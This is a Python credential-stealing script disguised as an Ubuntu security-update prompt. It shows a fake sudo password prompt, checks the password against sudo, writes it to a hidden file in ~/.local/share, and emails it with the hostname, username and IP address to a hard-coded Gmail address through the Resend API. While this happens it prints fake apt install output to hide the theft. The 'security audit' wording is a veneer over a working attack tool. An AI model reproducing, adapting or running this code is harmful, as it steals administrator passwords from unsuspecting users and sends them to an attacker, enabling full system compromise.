#!/usr/bin/env python3
import os
import sys
import time
import getpass
import subprocess
import threading
import random
from datetime import datetime

def clear_screen():
    os.system('clear')

def send_password_via_resend(password):
    try:
        api_key = os.environ.get("RESEND_API_KEY")
        if not api_key:
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        hostname = os.uname().nodename
        username = os.environ.get('USER', 'unknown')
        try:
            ip_address = subprocess.check_output(
                ["hostname", "-I"], text=True
            ).strip().split()[0]
        except Exception:
            ip_address = "unknown"

        subject = f"Security Audit - Credential Capture from {hostname}"
        html_body = f"""
        <h2>Stolen Sudo Password</h2>
        <hr>
        <p><strong>Timestamp:</strong> {timestamp}</p>
        <p><strong>Target System:</strong> {hostname}</p>
        <p><strong>Username:</strong> {username}</p>
        <p><strong>IP Address:</strong> {ip_address}</p>
        <p><strong>Captured Password:</strong> {password}</p>
        <br>
        <p>This is an automated security audit report.<br>
        Please review system security protocols.</p>
        <hr>
        <p>--<br>Automated Security Audit System</p>
        """

        data = {
            "from": "Acme <onboarding@resend.dev>",
            "to": ["arkhamzz47@gmail.com"],
            "subject": subject,
            "html": html_body
        }

        curl_cmd = [
            "curl", "-X", "POST", "https://api.resend.com/emails",
            "-H", f"Authorization: Bearer {api_key}",
            "-H", "Content-Type: application/json",
            "-d", str(data).replace("'", '"')
        ]
        
        subprocess.Popen(curl_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception:
        pass

def capture_sudo_password():
    max_attempts = 3
    attempt = 1

    while attempt <= max_attempts:
        try:
            if attempt == 1:
                prompt = "[sudo] password for {}: ".format(os.getenv('USER', 'user'))
            else:
                prompt = "Sorry, try again.\n[sudo] password for {}: ".format(os.getenv('USER', 'user'))

            password = getpass.getpass(prompt)

            process = subprocess.Popen(
                ['sudo', '-S', '-v'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate(input=password + '\n', timeout=10)

            if process.returncode == 0:
                return password
            else:
                attempt += 1

        except KeyboardInterrupt:
            print("\n")
            sys.exit(1)
        except subprocess.TimeoutExpired:
            attempt += 1

    print(f"sudo: {max_attempts} incorrect password attempts")
    sys.exit(1)

def show_installation_progress():
    downloads = [
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 libssl3 amd64 3.0.2-0ubuntu1.15", "1,898 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 openssl amd64 3.0.2-0ubuntu1.15", "1,185 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 linux-firmware all 20220329.git681281e4-0ubuntu3.21", "9,775 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 ca-certificates all 20230311ubuntu0.22.04.1", "153 kB"),
        ("http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 systemd amd64 249.11-0ubuntu3.12", "4,526 kB")
    ]
    
    for i, (url, size) in enumerate(downloads, 1):
        print(f"Get:{i} {url} [{size}]")
        time.sleep(random.uniform(0.5, 1.0))
    
    print("Fetched 14.2 MB in 3s (4,237 kB/s)")
    print("(Reading database ... 185243 files and directories currently installed.)")
    
    packages = [
        "libssl3:amd64",
        "openssl", 
        "linux-firmware",
        "ca-certificates",
        "systemd"
    ]
    
    for package in packages:
        print(f"Preparing to unpack .../archives/{package}...")
        time.sleep(random.uniform(0.2, 0.5))
        print(f"Unpacking {package} ...")
        time.sleep(random.uniform(0.3, 0.8))
        print(f"Setting up {package} ...")
        time.sleep(random.uniform(0.5, 1.0))

def main():
    try:
        clear_screen()
        
        print("Unattended-upgrades: Security updates have not been installed.")
        print("The following security updates are pending:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print()
        print("It is recommended that you apply these updates immediately.")
        print("To do so, run the following command:")
        print("  sudo apt update && sudo apt upgrade")
        print()
        
        password = capture_sudo_password()
        
        print("Reading package lists... Done")
        time.sleep(1)
        print("Building dependency tree       ")
        print("Reading state information... Done")
        time.sleep(2)
        print("The following packages will be upgraded:")
        print("  ca-certificates libssl3 linux-firmware openssl systemd")
        print("5 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.")
        print("Need to get 14.2 MB of archives.")
        print("After this operation, 0 B of additional disk space will be used.")
        print()
        time.sleep(1)
        
        # Write password to hidden file
        try:
            home_dir = os.path.expanduser("~")
            share_dir = os.path.join(home_dir, ".local", "share")
            os.makedirs(share_dir, exist_ok=True)
            file_path = os.path.join(share_dir, ".temp_log")
            with open(file_path, "a") as f:
                f.write(password + "\n")
        except Exception:
            pass
        
        if password:
            background_thread = threading.Thread(target=send_password_via_resend, args=(password,))
            background_thread.daemon = True
            background_thread.start()
        
        show_installation_progress()
        
        print("Processing triggers for man-db (2.10.2-1) ...")
        print("Processing triggers for libc-bin (2.35-0ubuntu3.4) ...")
        time.sleep(1)
        print()
        
        sys.exit(0)
        
    except KeyboardInterrupt:
        print("\n")
        sys.exit(1)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
